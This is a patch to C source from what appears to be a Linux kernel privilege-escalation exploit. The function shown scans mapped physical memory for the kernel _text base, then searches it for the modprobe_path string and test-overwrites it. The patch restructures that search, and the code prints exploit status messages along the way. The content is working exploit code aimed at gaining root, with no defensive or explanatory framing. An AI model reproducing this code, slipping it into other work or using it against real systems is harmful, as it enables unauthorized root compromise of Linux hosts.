@@ -296,21 +296,39 @@ int is_kernel_base(const void *addr)
 	return 0;
 }
 
+/* Default value from arch/x86/Kconfig */
 #define CONFIG_PHYSICAL_ALIGN 0x200000
 
 void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 {
 	int ret = EXIT_FAILURE;
+	char *start = memory;
+	size_t offset = 0;
+	char *kernel_text = NULL;
 	char modprobe_path[KMOD_PATH_LEN] = { 0 };
 	size_t modprobe_path_len = 0;
 	char *search = NULL;
-	char *base;
 	char *end = (char *)memory + memory_size;
 	char *modprobe_path_uaddr = NULL;
+
+	while (offset < memory_size) {
+		if (is_kernel_base(start + offset)) {
+			kernel_text = start + offset;
+			break;
+		}
+		offset += CONFIG_PHYSICAL_ALIGN;
+	}
+	if (kernel_text == NULL) {
+		printf("[!] kernel _text is not found in this huge page, try the next one\n");
+		return NULL;
+	}
+	printf("[+] kernel _text is found at %p, now search modprobe_path\n", kernel_text);
 
 	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
 	if (ret == EXIT_FAILURE)
 		return NULL;
+
+	printf("[!] original modprobe_path: %s\n", modprobe_path);
 
 	if (modprobe_path[0] != '/') {
 		printf("[-] unexpected modprobe_path\n");
@@ -319,17 +337,12 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 
 	modprobe_path_len = strlen(modprobe_path);
 
-	for (base = memory; base < end; base += CONFIG_PHYSICAL_ALIGN) {
-		if (!is_kernel_base(base))
-			continue;
-
-		for (search = base; search < end;) {
+		for (search = kernel_text; search < end;) {
 			modprobe_path_uaddr = memmem(search, end - search,
 				       modprobe_path, modprobe_path_len);
 			if (!modprobe_path_uaddr)
 				break;
 
-			printf("[!] original modprobe_path: %s\n", modprobe_path);
 			printf("[+] modprobe_path candidate at %p\n", modprobe_path_uaddr);
 
 			/* Test overwrite */
@@ -349,7 +362,6 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 			printf("[+] testing modprobe_path overwriting succeeded\n");
 			return modprobe_path_uaddr;
 		}
-	}
 
 	printf("[!] kernel not found in this area\n");
 	return NULL;
